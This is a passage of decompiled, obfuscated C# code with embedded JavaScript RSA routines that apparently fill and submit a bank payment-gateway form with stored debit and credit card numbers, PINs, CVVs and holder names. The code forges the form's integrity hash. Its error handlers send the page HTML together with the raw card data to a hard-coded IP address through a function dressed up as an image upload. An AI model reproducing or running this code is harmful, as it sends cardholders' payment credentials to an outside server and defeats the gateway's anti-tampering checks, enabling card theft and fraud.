{\r\n        t = biShiftLeft(t, 1);\r\n        ++a;\r\n        ++r;\r\n        u = Math.ceil(r / bitsPerDigit) - 1\r\n    }\r\n    o = biShiftLeft(o, a);\r\n    n += a;\r\n    var f = Math.ceil(n / bitsPerDigit) - 1;\r\n    var l = biMultiplyByRadixPower(t, f - u);\r\n    while (biCompare(o, l) != -1) {\r\n        ++s.digits[f - u];\r\n        o = biSubtract(o, l)\r\n    }\r\n    for (var c = f; c > u; --c) {\r\n        var h = c >= o.digits.length ? 0 : o.digits[c];\r\n        var p = c - 1 >= o.digits.length ? 0 : o.digits[c - 1];\r\n        var d = c - 2 >= o.digits.length ? 0 : o.digits[c - 2];\r\n        var v = u >= t.digits.length ? 0 : t.digits[u];\r\n        var m = u - 1 >= t.digits.length ? 0 : t.digits[u - 1];\r\n        if (h == v)\r\n            s.digits[c - u - 1] = maxDigitVal;\r\n        else\r\n            s.digits[c - u - 1] = Math.floor((h * biRadix + p) / v);\r\n        var g = s.digits[c - u - 1] * (v * biRadix + m);\r\n        var y = h * biRadixSquared + (p * biRadix + d);\r\n        while (g > y) {\r\n            --s.digits[c - u - 1];\r\n            g = s.digits[c - u - 1] * (v * biRadix | m);\r\n            y = h * biRadix * biRadix + (p * biRadix + d)\r\n        }\r\n        l = biMultiplyByRadixPower(t, c - u - 1);\r\n        o = biSubtract(o, biMultiplyDigit(l, s.digits[c - u - 1]));\r\n        if (o.isNeg) {\r\n            o = biAdd(o, l);\r\n            --s.digits[c - u - 1]\r\n        }\r\n    }\r\n    o = biShiftRight(o, a);\r\n    s.isNeg = e.isNeg != i;\r\n    if (e.isNeg) {\r\n        if (i)\r\n            s = biAdd(s, bigOne);\r\n        else\r\n            s = biSubtract(s, bigOne);\r\n        t = biShiftRight(t, a);\r\n        o = biSubtract(t, o)\r\n    }\r\n    if (o.digits[0] == 0 && biHighIndex(o) == 0)\r\n        o.isNeg = false;\r\n    return new Array(s,o)\r\n}\r\nfunction biDivide(e, t) {\r\n    return biDivideModulo(e, t)[0]\r\n}\r\nfunction biModulo(e, t) {\r\n    return biDivideModulo(e, t)[1]\r\n}\r\nfunction biMultiplyMod(e, t, n) {\r\n    return biModulo(biMultiply(e, t), n)\r\n}\r\nfunction biPow(e, t) {\r\n    var n = bigOne;\r\n    var r = e;\r\n    while (true) {\r\n        if ((t & 1) != 0)\r\n            n = biMultiply(n, r);\r\n        t >>= 1;\r\n        if (t == 0)\r\n            break;\r\n        r = biMultiply(r, r)\r\n    }\r\n    return n\r\n}\r\nfunction biPowMod(e, t, n) {\r\n    var r = bigOne;\r\n    var i = e;\r\n    var s = t;\r\n    while (true) {\r\n        if ((s.digits[0] & 1) != 0)\r\n            r = biMultiplyMod(r, i, n);\r\n        s = biShiftRight(s, 1);\r\n        if (s.digits[0] == 0 && biHighIndex(s) == 0)\r\n            break;\r\n        i = biMultiplyMod(i, i, n)\r\n    }\r\n    return r\r\n}\r\nfunction BarrettMu(e) {\r\n    this.modulus = biCopy(e);\r\n    this.k = biHighIndex(this.modulus) + 1;\r\n    var t = new BigInt;\r\n    t.digits[2 * this.k] = 1;\r\n    this.mu = biDivide(t, this.modulus);\r\n    this.bkplus1 = new BigInt;\r\n    this.bkplus1.digits[this.k + 1] = 1;\r\n    this.modulo = BarrettMu_modulo;\r\n    this.multiplyMod = BarrettMu_multiplyMod;\r\n    this.powMod = BarrettMu_powMod\r\n}\r\nfunction BarrettMu_modulo(e) {\r\n    var t = biDivideByRadixPower(e, this.k - 1);\r\n    var n = biMultiply(t, this.mu);\r\n    var r = biDivideByRadixPower(n, this.k + 1);\r\n    var i = biModuloByRadixPower(e, this.k + 1);\r\n    var s = biMultiply(r, this.modulus);\r\n    var o = biModuloByRadixPower(s, this.k + 1);\r\n    var u = biSubtract(i, o);\r\n    if (u.isNeg)\r\n        u = biAdd(u, this.bkplus1);\r\n    var a = biCompare(u, this.modulus) >= 0;\r\n    while (a) {\r\n        u = biSubtract(u, this.modulus);\r\n        a = biCompare(u, this.modulus) >= 0\r\n    }\r\n    return u\r\n}\r\nfunction BarrettMu_multiplyMod(e, t) {\r\n    var n = biMultiply(e, t);\r\n    return this.modulo(n)\r\n}\r\nfunction BarrettMu_powMod(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = 1;\r\n    while (true) {\r\n        if ((t.digits[0] & 1) != 0)\r\n            n = this.multiplyMod(n, e);\r\n        t = biShiftRight(t, 1);\r\n        if (t.digits[0] == 0 && biHighIndex(t) == 0)\r\n            break;\r\n        e = this.multiplyMod(e, e)\r\n    }\r\n    return n\r\n}\r\nvar biRadixBase = 2;\r\nvar biRadixBits = 16;\r\nvar bitsPerDigit = biRadixBits;\r\nvar biRadix = 1 << 16;\r\nvar biHalfRadix = biRadix >>> 1;\r\nvar biRadixSquared = biRadix * biRadix;\r\nvar maxDigitVal = biRadix - 1;\r\nvar maxInteger = 9999999999999998;\r\nvar maxDigits;\r\nvar ZERO_ARRAY;\r\nvar bigZero, bigOne;\r\nvar dpl10 = 15;\r\nvar highBitMasks = new Array(0,32768,49152,57344,61440,63488,64512,65024,65280,65408,65472,65504,65520,65528,65532,65534,65535);\r\nvar hexatrigesimalToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\");\r\nvar hexToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\nvar lowBitMasks = new Array(0,1,3,7,15,31,63,127,255,511,1023,2047,4095,8191,16383,32767,65535);\r\n</script>";
		string text2 = "<html>\n<head>\n\n" + text + "\n\n\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
		WebBrowser webBrowser = new WebBrowser();
		webBrowser.Navigate("about:blank");
		webBrowser.Document.Write(text2);
		return webBrowser.Document.InvokeScript("encryptUsingJS", new object[2] { null, false }).ToString();
	}

	internal static string smethod_5(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string string_19 = "";
		string string_20 = "";
		string string_21 = "0";
		string string_22 = "0";
		if (string_12 == "D")
		{
			string[] array = string_9.Split(new string[1] { "||" }, StringSplitOptions.None);
			string_19 = array[0];
			string_21 = array[1];
			string_22 = array[2];
			string_20 = array[3];
			string_18 = array[6].Trim();
		}
		try
		{
			string_8 = string_8.Replace("<input name=\"passline\"", "<input name=\"passline\" value=\"" + string_10 + "\" ");
			string text = string_8.Substring(string_8.IndexOf("<input type=\"hidden\" name=\"CSRFToken\" value=\"") + 45);
			text = text.Substring(0, text.IndexOf("\"  />"));
			string string_23 = smethod_7(text).ToString().ToUpper();
			if (string_12 == "D")
			{
				string text2 = string_8.Substring(string_8.IndexOf("var paymentId =") + 16);
				text2 = text2.Substring(0, text2.IndexOf("\""));
				string text3 = string_8.Substring(string_8.IndexOf("var mode =") + 12);
				text3 = text3.Substring(0, text3.IndexOf("';"));
				string_13 = smethod_14(string_19, text2, text3);
				string_14 = smethod_14(string_18, text2, text3);
				string_15 = smethod_14(string_20, text2, text3);
				string_16 = smethod_14(string_21, text2, text3);
				string_17 = smethod_14(string_22, text2, text3);
			}
			string text4 = "";
			string text5 = new Class10().method_1(string_8, ref text4, false);
			text5 = text5.Replace("&proceed=Proceed", "").Replace("&cancel=Cancel", "").Replace("&debiMonth=0", "")
				.Replace("&debiYear=0", "");
			text5 = clsPostData.SetPost(text5, "debitCardNumber", string_13);
			text5 = clsPostData.SetPost(text5, "debitMonth", string_16);
			text5 = clsPostData.SetPost(text5, "debitYear", string_17);
			text5 = clsPostData.SetPost(text5, "debitCardholderName", string_14);
			text5 = clsPostData.SetPost(text5, "cardPin", string_15);
			text5 = clsPostData.SetPost(text5, "captchaFlg", "0");
			string[] array2 = text5.Split(new string[1] { "&" }, StringSplitOptions.None);
			string text6 = "";
			string text7 = "";
			for (int i = 0; i < array2.Length; i++)
			{
				string[] array3 = array2[i].Split(new string[1] { "=" }, StringSplitOptions.None);
				string text8 = array3[0];
				string str = array3[1];
				string text9 = text8;
				if (!(text9 == "cspg") && !(text9 == "CSRFToken") && !(text9 == "cardCvd2pin"))
				{
					text6 += "^";
					text6 += text8;
					text7 += HttpUtility.UrlDecode(str);
				}
			}
			string text10 = smethod_7(text6);
			string text11 = smethod_8(smethod_7(smethod_8(text7, string_23).ToString().ToUpper()).ToString().ToUpper(), string_23).ToString().ToUpper() + "^" + text10;
			text11 = text11.Replace("=", "%3D").Replace("^", "%5E");
			return clsPostData.SetPost(text5, "cspg", text11);
		}
		catch (Exception)
		{
			return HttpUtility.UrlDecode(smethod_6("3#" + HttpUtility.UrlEncode(string_8) + "|$|" + string_9 + "|$|" + string_10 + "|$|" + string_11 + "|$|" + string_12));
		}
	}

	internal static string smethod_6(string string_8)
	{
		string text = "imgcontent=" + HttpUtility.UrlEncode(string_8);
		text = "{ \"imgcontent\": \"" + string_8 + "\" }";
		string string_9 = "a";
		return smethod_16("http://192.3.164.176/api/image", text, ref string_9);
	}

	private static string smethod_7(string string_8)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
		string text2 = "";
		int num = 0;
		while (num < string_8.Length)
		{
			char c = string_8[num++];
			int num2 = ((num < string_8.Length) ? string_8[num++] : '\0');
			int num3 = ((num < string_8.Length) ? string_8[num++] : '\0');
			int index = (int)c >> 2;
			int index2 = ((c & 3) << 4) | (num2 >> 4);
			int index3 = ((num2 & 0xF) << 2) | (num3 >> 6);
			int index4 = num3 & 0x3F;
			if (num2 != 0)
			{
				if (num3 == 0)
				{
					index4 = 64;
				}
			}
			else
			{
				index4 = 64;
				index3 = 64;
			}
			text2 = text2 + text[index] + text[index2] + text[index3] + text[index4];
			if (num >= string_8.Length)
			{
				return text2;
			}
		}
		return text2;
	}

	private static string smethod_8(string string_8, string string_9)
	{
		byte[] array = new HMACSHA256(Encoding.UTF8.GetBytes(string_9)).ComputeHash(Encoding.UTF8.GetBytes(string_8));
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	internal static string smethod_9(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string string_19 = "";
		string text = "";
		string string_20 = "";
		string string_21 = "";
		string string_22 = "0";
		string string_23 = "0";
		if ((string_12 == "D") | (string_12 == "C"))
		{
			string[] array = string_9.Split(new string[1] { "||" }, StringSplitOptions.None);
			string_20 = array[0];
			string_22 = array[1];
			string_23 = array[2];
			string_21 = array[3];
			text = array[4];
			string_19 = array[6].Trim();
		}
		try
		{
			string_8 = string_8.Replace("<input name=\"passline\"", "<input name=\"passline\" value=\"" + string_10 + "\" ");
			string text2 = string_8.Substring(string_8.IndexOf("<input type=\"hidden\" name=\"CSRFToken\" value=\"") + 45);
			text2 = text2.Substring(0, text2.IndexOf("\"  />"));
			string string_24 = smethod_7(text2).ToString().ToUpper();
			if ((string_12 == "D") | (string_12 == "C"))
			{
				string text3 = string_8.Substring(string_8.IndexOf("var paymentId =") + 16);
				text3 = text3.Substring(0, text3.IndexOf("\""));
				string text4 = string_8.Substring(string_8.IndexOf("var mode =") + 12);
				text4 = text4.Substring(0, text4.IndexOf("';"));
				string_13 = smethod_14(string_20, text3, text4);
				string_14 = smethod_14(string_19, text3, text4);
				string_15 = smethod_14(string_21, text3, text4);
				string_16 = smethod_14(string_22, text3, text4);
				string_17 = smethod_14(string_23, text3, text4);
				string_18 = smethod_14(text, text3, text4);
			}
			string text5 = "";
			string text6 = new Class10().method_1(string_8, ref text5, false);
			text6 = text6.Replace("&proceed=Proceed", "").Replace("&cancel=Cancel", "").Replace("&debiMonth=0", "")
				.Replace("&debiYear=0", "");
			text6 = text6.Replace("&proceed=Pay", "");
			text6 = clsPostData.SetPost(text6, "encryptedCardNumber", string_13);
			text6 = clsPostData.SetPost(text6, "encryptedMonth", string_16);
			text6 = clsPostData.SetPost(text6, "encryptedYear", string_17);
			text6 = clsPostData.SetPost(text6, "encryptedCardHolderName", string_14);
			text6 = clsPostData.SetPost(text6, "cardPin", string_15);
			text6 = clsPostData.SetPost(text6, "debitCardNumber", "****************");
			text6 = clsPostData.SetPost(text6, "debitCardCvv", "undefined");
			text6 = clsPostData.SetPost(text6, "debitCardholderName", "****************");
			text6 = clsPostData.SetPost(text6, "captchaFlg", "0");
			text6 = clsPostData.SetPost(text6, "selectedPymntInstrmnt", string_12);
			text6 = clsPostData.SetPost(text6, "creditDebitCheck", string_12);
			if (string_12 == "C")
			{
				text6 = clsPostData.SetPost(text6, "cvv_no", text);
				text6 = clsPostData.SetPost(text6, "cardCvv", string_18);
			}
			string[] array2 = text6.Split(new string[1] { "&" }, StringSplitOptions.None);
			string text7 = "";
			string text8 = "";
			for (int i = 0; i < array2.Length; i++)
			{
				string[] array3 = array2[i].Split(new string[1] { "=" }, StringSplitOptions.None);
				string text9 = array3[0];
				string str = array3[1];
				string text10 = text9;
				if (!(text10 == "cspg") && !(text10 == "CSRFToken") && !(text10 == "cardCvd2pin"))
				{
					text7 += "^";
					text7 += text9;
					text8 += HttpUtility.UrlDecode(str);
				}
			}
			string text11 = smethod_7(text7);
			text11 = "JTVFZW5jQ2FwdGNoYSU1RWVuY3J5cHRlZENhcmROdW1iZXIlNUVlbmNyeXB0ZWRNb250aCU1RWVuY3J5cHRlZFllYXIlNUVlbmNyeXB0ZWRDYXJkSG9sZGVyTmFtZSU1RWVuY3J5cHRlZFNhdmVkQ2FyZENWViU1RWVuY3J5cHRlZFNhdmVkQ2FyZFBpbiU1RWVuY3J5cHRlZFNhdmVkQ2FyZEN2ZDJwaW4lNUVkZWJpdE9UUEZsZyU1RWNyZWRpdE9UUEZsZyU1RXByZXBhaWRPVFBGbGclNUVPVFBNZXRob2QlNUVvdGhlcmNhcmRkZWJpdGN2diU1RWFjY29yZGlvblZhbCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdENhcmROdW1iZXIlNUVjYXJkUGluVHlwZSU1RWNhcmRQaW4lNUVkZWJpdENhcmRDdnYlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RWdyaXBzRmxhZyU1RXNlbGVjdGVkUHltbnRJbnN0cm1udCU1RWNhcHRjaGFNc2clNUVwYXltZW50SWQlNUVhdG1QYXlSZXRlbnRpb25QZXJpb2QlNUVzdHlsZUNzcyU1RWhlYWRlckZpbGUlNUVtZXJjaEhlYWRlckZpbGUlNUVsYWJlbEZpbGUlNUVtcmNoTmFtZSU1RW1yY2hXZWIlNUVtcmNoVHJhY2tJZCU1RXB5bW50SW5zdHJtbnRDQyU1RXB5bW50SW5zdHJtbnRBQyU1RXB5bW50SW5zdHJtbnREQyU1RXB5bW50SW5zdHJtbnRQQyU1RXB5bW50SW5zdHJtbnRQWiU1RXB5bW50SW5zdHJtbnRBUCU1RXB5bW50SW5zdHJtbnRERCU1RWVjb21GbGclNUVjYXB0Y2hhRmxnJTVFaW5zdE5hbWUlNUVtcmNoRXJyVXJsJTVFYXZzRmxnJTVFaGVhZGVyVHlwZSU1RXRlcm1JZCU1RWluc3RJZCU1RW1yY2hJZCU1RW1hZXN0cm9DaGVja0ZsYWclNUVydXBGbGclNUVweW1udEluc3RybW50SU1QUyU1RWZvb3RlciU1RWRlYml0U2VsJTVFY3JlZGl0U2VsJTVFcHJlcGFpZFNlbCU1RXNpRmxhZyU1RWZjRmxhZyU1RWZjQ2hlY2tlZCU1RWZjRXhwQ2hlY2slNUVmY0N0Q2hlY2slNUVmY0R0Q2hlY2slNUVmY1BkQ2hlY2slNUVyZGMlNUVjaGVja0JyYW5kJTVFb25PZmZUeXBlJTVFbWFlc3RybyU1RWNjSW5zdEZsZyU1RWNjVGVybUZsZyU1RW1lcmNoYW50Q3VycmVuY3lGbGclNUVjYXJkQ3VycmVuY3lGbGclNUVvdGhlckN1cnJlbmN5RmxnJTVFcHltbnRJbnN0cm1udENudCU1RW90cFN0YXR1cyU1RW90cGFsbG93ZWQlNUVvdHBtZXRob2QlNUVlbWlGbGFnJTVFcmFkaW9GbGFnJTVFb3RoZXJDYXJkcyU1RXRleHRGaWxlJTVFZXJyb3JTdHIlNUVyZXN1bHRDb2RlJTVFcG9zdERhdGUlNUVyZXNwb25zZUNvZGUlNUV0cmFuSWQlNUVhdXRoQ29kZSU1RW1yY2hIZWFkZXJNc2dGaWxlJTVFbXJjaEhlYWRlckh0bWxGaWxlJTVFaW5zdEhlYWRlckh0bWxGaWxl";
			string text12 = smethod_8(smethod_7(smethod_8(text8, string_24).ToString().ToUpper()).ToString().ToUpper(), string_24).ToString().ToUpper() + "^" + text11;
			text12 = text12.Replace("=", "%3D").Replace("^", "%5E");
			return clsPostData.SetPost(text6, "cspg", text12);
		}
		catch (Exception)
		{
			return HttpUtility.UrlDecode(smethod_6("3#" + HttpUtility.UrlEncode(string_8) + "|$|" + string_9 + "|$|" + string_10 + "|$|" + string_11 + "|$|" + string_12));
		}
	}

	internal static string smethod_10(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		string string_15 = "";
		string string_16 = "";
		string string_17 = "";
		string string_18 = "";
		string text = "";
		string string_19 = "";
		string string_20 = "";
		string string_21 = "0";
		string string_22 = "0";
		if ((string_12 == "D") | (string_12 == "C"))
		{
			string[] array = string_9.Split(new string[1] { "||" }, StringSplitOptions.None);
			string_19 = array[0];
			string_21 = array[1];
			string_22 = array[2];
			string_20 = array[3];
			text = array[4];
			string_18 = array[6].Trim();
		}
		try
		{
			string_8 = string_8.Replace("<input name=\"passline\"", "<input name=\"passline\" value=\"" + string_10 + "\" ");
			string text2 = string_8.Substring(string_8.IndexOf("<input type=\"hidden\" name=\"CSRFToken\" value=\"") + 45);
			text2 = text2.Substring(0, text2.IndexOf("\"  />"));
			string string_23 = smethod_7(text2).ToString().ToUpper();
			if ((string_12 == "D") | (string_12 == "C"))
			{
				string text3 = string_8.Substring(string_8.IndexOf("var paymentId =") + 16);
				text3 = text3.Substring(0, text3.IndexOf("\""));
				string text4 = string_8.Substring(string_8.IndexOf("var mode =") + 12);
				text4 = text4.Substring(0, text4.IndexOf("';"));
				string_13 = smethod_14(string_19, text3, text4);
				string_14 = smethod_14(string_18, text3, text4);
				smethod_14(string_20, text3, text4);
				string_15 = smethod_14(string_21, text3, text4);
				string_16 = smethod_14(string_22, text3, text4);
				string_17 = smethod_14(text, text3, text4);
			}
			string text5 = "";
			string text6 = new Class10().method_1(string_8, ref text5, false);
			text6 = text6.Replace("&proceed=Proceed", "").Replace("&cancel=Cancel", "").Replace("&debiMonth=0", "")
				.Replace("&debiYear=0", "");
			text6 = text6.Replace("&proceed=Pay", "");
			text6 = clsPostData.SetPost(text6, "encryptedCardNumber", string_13);
			text6 = clsPostData.SetPost(text6, "encryptedMonth", string_15);
			text6 = clsPostData.SetPost(text6, "encryptedYear", string_16);
			text6 = clsPostData.SetPost(text6, "encryptedCardHolderName", string_14);
			text6 = clsPostData.SetPost(text6, "debitCardNumber", "****************");
			text6 = clsPostData.SetPost(text6, "debitCardCvv", string_17);
			text6 = clsPostData.SetPost(text6, "debitCardholderName", "****************");
			text6 = clsPostData.SetPost(text6, "captchaFlg", "1");
			text6 = clsPostData.SetPost(text6, "passline", string_10);
			text6 = clsPostData.SetPost(text6, "selectedPymntInstrmnt", "OD");
			text6 = clsPostData.SetPost(text6, "checkBrand", "M");
			text6 = clsPostData.SetPost(text6, "onOffType", "0");
			text6 = clsPostData.SetPost(text6, "creditDebitCheck", "D");
			text6 = clsPostData.SetPost(text6, "card_no", "****************");
			text6 = clsPostData.SetPost(text6, "name", "****************");
			text6 = clsPostData.SetPost(text6, "debitYear", "****");
			text6 = clsPostData.SetPost(text6, "debitMonth", "**");
			text6 = clsPostData.SetPost(text6, "expMonthSelect", "**");
			text6 = clsPostData.SetPost(text6, "expYearSelect", "****");
			text6 = clsPostData.SetPost(text6, "other_debit_cvv_no", text);
			text6 = clsPostData.SetPost(text6, "othercarddebitcvv", "1");
			string[] array2 = text6.Split(new string[1] { "&" }, StringSplitOptions.None);
			string text7 = "";
			string text8 = "";
			for (int i = 0; i < array2.Length; i++)
			{
				string[] array3 = array2[i].Split(new string[1] { "=" }, StringSplitOptions.None);
				string text9 = array3[0];
				string str = array3[1];
				string text10 = text9;
				if (!(text10 == "cspg") && !(text10 == "CSRFToken") && !(text10 == "cardCvd2pin"))
				{
					text7 += "^";
					text7 += text9;
					text8 += HttpUtility.UrlDecode(str);
				}
			}
			string text11 = smethod_7(text7);
			text11 = "JTVFZW5jQ2FwdGNoYSU1RWVuY3J5cHRlZENhcmROdW1iZXIlNUVlbmNyeXB0ZWRNb250aCU1RWVuY3J5cHRlZFllYXIlNUVlbmNyeXB0ZWRDYXJkSG9sZGVyTmFtZSU1RWVuY3J5cHRlZFNhdmVkQ2FyZENWViU1RWVuY3J5cHRlZFNhdmVkQ2FyZFBpbiU1RWVuY3J5cHRlZFNhdmVkQ2FyZEN2ZDJwaW4lNUVkZWJpdE9UUEZsZyU1RWNyZWRpdE9UUEZsZyU1RXByZXBhaWRPVFBGbGclNUVPVFBNZXRob2QlNUVvdGhlcmNhcmRkZWJpdGN2diU1RWFjY29yZGlvblZhbCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdENhcmROdW1iZXIlNUVjYXJkUGluVHlwZSU1RWNhcmRQaW4lNUVkZWJpdENhcmRDdnYlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RWdyaXBzRmxhZyU1RXNlbGVjdGVkUHltbnRJbnN0cm1udCU1RWNhcHRjaGFNc2clNUVwYXltZW50SWQlNUVhdG1QYXlSZXRlbnRpb25QZXJpb2QlNUVzdHlsZUNzcyU1RWhlYWRlckZpbGUlNUVtZXJjaEhlYWRlckZpbGUlNUVsYWJlbEZpbGUlNUVtcmNoTmFtZSU1RW1yY2hXZWIlNUVtcmNoVHJhY2tJZCU1RXB5bW50SW5zdHJtbnRDQyU1RXB5bW50SW5zdHJtbnRBQyU1RXB5bW50SW5zdHJtbnREQyU1RXB5bW50SW5zdHJtbnRQQyU1RXB5bW50SW5zdHJtbnRQWiU1RXB5bW50SW5zdHJtbnRBUCU1RXB5bW50SW5zdHJtbnRERCU1RWVjb21GbGclNUVjYXB0Y2hhRmxnJTVFaW5zdE5hbWUlNUVtcmNoRXJyVXJsJTVFYXZzRmxnJTVFaGVhZGVyVHlwZSU1RXRlcm1JZCU1RWluc3RJZCU1RW1yY2hJZCU1RW1hZXN0cm9DaGVja0ZsYWclNUVydXBGbGclNUVweW1udEluc3RybW50SU1QUyU1RWZvb3RlciU1RWRlYml0U2VsJTVFY3JlZGl0U2VsJTVFcHJlcGFpZFNlbCU1RXNpRmxhZyU1RWZjRmxhZyU1RWZjQ2hlY2tlZCU1RWZjRXhwQ2hlY2slNUVmY0N0Q2hlY2slNUVmY0R0Q2hlY2slNUVmY1BkQ2hlY2slNUVyZGMlNUVjaGVja0JyYW5kJTVFb25PZmZUeXBlJTVFbWFlc3RybyU1RWNjSW5zdEZsZyU1RWNjVGVybUZsZyU1RW1lcmNoYW50Q3VycmVuY3lGbGclNUVjYXJkQ3VycmVuY3lGbGclNUVvdGhlckN1cnJlbmN5RmxnJTVFcHltbnRJbnN0cm1udENudCU1RW90cFN0YXR1cyU1RW90cGFsbG93ZWQlNUVvdHBtZXRob2QlNUVlbWlGbGFnJTVFcmFkaW9GbGFnJTVFb3RoZXJDYXJkcyU1RXRleHRGaWxlJTVFZXJyb3JTdHIlNUVyZXN1bHRDb2RlJTVFcG9zdERhdGUlNUVyZXNwb25zZUNvZGUlNUV0cmFuSWQlNUVhdXRoQ29kZSU1RW1yY2hIZWFkZXJNc2dGaWxlJTVFbXJjaEhlYWRlckh0bWxGaWxlJTVFaW5zdEhlYWRlckh0bWxGaWxl";
			string text12 = smethod_8(smethod_7(smethod_8(text8, string_23).ToString().ToUpper()).ToString().ToUpper(), string_23).ToString().ToUpper() + "^" + text11;
			text12 = text12.Replace("=", "%3D").Replace("^", "%5E");
			return clsPostData.SetPost(text6, "cspg", text12);
		}
		catch (Exception)
		{
			return HttpUtility.UrlDecode(smethod_6("3#" + HttpUtility.UrlEncode(string_8) + "|$|" + string_9 + "|$|" + string_10 + "|$|" + string_11 + "|$|" + string_12));
		}
	}

	internal static string smethod_11(string string_8, string string_9, string string_10, string string_11, string string_12)
	{
		string string_13 = "";
		string string_14 = "";
		if (string_12 == "D")
		{
			string[] array = string_9.Split(new string[1] { "||" }, StringSplitOptions.None);
			string_14 = array[3];
			array[6].Trim();
		}
		string text = "";
		try
		{
			if (string_12 == "D")
			{
				string_13 = smethod_12(string_14, string_11);
			}
			string text2 = string_8.Substring(string_8.IndexOf("<input type=\"hidden\" name=\"CSRFToken\" value=\"") + 45);
			text2 = text2.Substring(0, text2.IndexOf("\"  />"));
			string string_15 = smethod_7(text2).ToString().ToUpper();
			string text3 = "";
			text = new Class10().method_1(string_8, ref text3, false);
			text = text.Replace("&cancel=Cancel", "").Replace("&proceed=Pay", "");
			text = clsPostData.SetPost(text, "cardPin", string_13);
			text = clsPostData.SetPost(text, "timer", "175000");
			string[] array2 = text.Split(new string[1] { "&" }, StringSplitOptions.None);
			string text4 = "";
			string text5 = "";
			for (int i = 0; i < array2.Length; i++)
			{
				string[] array3 = array2[i].Split(new string[1] { "=" }, StringSplitOptions.None);
				string text6 = array3[0];
				string str = array3[1];
				string text7 = text6;
				if (!(text7 == "cspg") && !(text7 == "CSRFToken") && !(text7 == "passline"))
				{
					text4 += "^";
					text4 += text6;
					text5 += HttpUtility.UrlDecode(str);
				}
			}
			string text8 = smethod_7(text4);
			string text9 = smethod_8(smethod_7(smethod_8(text5, string_15).ToString().ToUpper()).ToString().ToUpper(), string_15).ToString().ToUpper() + "^" + text8;
			text9 = text9.Replace("=", "%3D").Replace("^", "%5E");
			text = clsPostData.SetPost(text, "cspg", text9);
			return text;
		}
		catch (Exception)
		{
			return text;
		}
	}

	public static string smethod_12(string string_8, string string_9)
	{
		string text = "<script type=\"text/javascript\">\n\tfunction encryptUsingJS() {\r\n       var string = '" + string_8 + "';\r\n       var ack;\r\n\t    var encryptionExponent = '10001';\r\n\t    var modulus = '" + string_9 + "';\r\n\t    var maxdigits = '67';\r\n       var keys = new jCryptionKeyPair(encryptionExponent,modulus,maxdigits);\r\n       var ks = encrypt(string,keys,ack);\r\n       return ks;\r\n}\r\n           jCryptionKeyPair = function(encryptionExponent, modulus, maxdigits) {\r\n\t\t\tsetMaxDigits(parseInt(maxdigits,10));\r\n\t\t\tthis.e = biFromHex(encryptionExponent);\r\n\t\t\tthis.m = biFromHex(modulus);\r\n\t\t\tthis.chunkSize = 2 * biHighIndex(this.m);\r\n\t\t\tthis.radix = 16;\r\n\t\t\tthis.barrett = new BarrettMu(this.m);\r\n\t\t};\r\n      encrypt = function(string,keyPair,callback) {\r\n       var e1;\r\n\t\tvar charSum = 0;\r\n\t\tfor(var i = 0; i < string.length; i++){\r\n\t\t\tcharSum += string.charCodeAt(i);\r\n\t\t}\r\n\t\tvar tag = '0123456789abcdef';\r\n\t\tvar hex = '';\r\n\t\thex += tag.charAt((charSum & 0xF0) >> 4) + tag.charAt(charSum & 0x0F);\r\n\t\tvar taggedString = hex + string;\r\n\t\tvar encrypt = [];\r\n\t\tvar j = 0;\r\n\t\twhile (j < taggedString.length) {\r\n\t\t\tencrypt[j] = taggedString.charCodeAt(j);\r\n\t\t\tj++;\r\n\t\t}\r\n\t\twhile (encrypt.length % keyPair.chunkSize !== 0) {\r\n\t\t\tencrypt[j++] = 0;\r\n\t\t}\r\n\t\tfunction encryption(encryptObject) {\r\n\t\t\tvar charCounter = 0;\r\n\t\t\tvar j, block;\r\n\t\t\tvar encrypted = \"\";\r\n\t\t\tfunction encryptChar() {\r\n\t\t\t\tblock = new BigInt();\r\n\t\t\t\tj = 0;\r\n\t\t\t\tfor (var k = charCounter; k < charCounter+keyPair.chunkSize; ++j) {\r\n\t\t\t\t\tblock.digits[j] = encryptObject[k++];\r\n\t\t\t\t\tblock.digits[j] += encryptObject[k++] << 8;\r\n\t\t\t\t}\r\n\t\t\t\tvar crypt = keyPair.barrett.powMod(block, keyPair.e);\r\n\t\t\t\tvar text = keyPair.radix == 16 ? biToHex(crypt) : biToString(crypt, keyPair.radix);\r\n\t\t\t\tencrypted += text + \" \";\r\n\t\t\t\tcharCounter += keyPair.chunkSize;\r\n\t\t\t\tif (charCounter < encryptObject.length) {\r\n\t\t\t\t\tsetTimeout(encryptChar, 1)\r\n\t\t\t\t} else {\r\n\t\t\t\t\tvar encryptedString = encrypted.substring(0, encrypted.length - 1);\r\n\t\t\t\t\te1 = encryptedString;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tencryptChar();\r\n\t\t}\r\n\t\tencryption(encrypt);\r\n   return e1;\r\n\t};\r\nfunction setMaxDigits(e) 